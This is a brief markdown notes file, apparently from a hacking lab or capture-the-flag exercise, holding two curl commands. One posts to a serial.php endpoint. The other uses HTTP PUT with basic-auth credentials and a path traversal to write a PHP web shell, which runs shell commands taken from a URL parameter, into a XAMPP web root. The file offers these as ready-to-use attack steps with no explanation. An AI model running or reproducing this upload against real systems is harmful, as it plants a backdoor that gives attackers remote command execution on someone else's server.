# post request
```
curl -X POST http://154.57.164.80:30178/serial.php
```

# path traversal shell upload
```
curl -k -X PUT -H "Host: 10.129.203.7" --basic -u fiona:987654321 --data-binary '<?php echo shell_exec($_GET["c"]);?>' --path-as-is https://10.129.203.7/../../../../../../xampp/htdocs/1af271ec0835f7ccbd31dc34666f7f34.php
```




















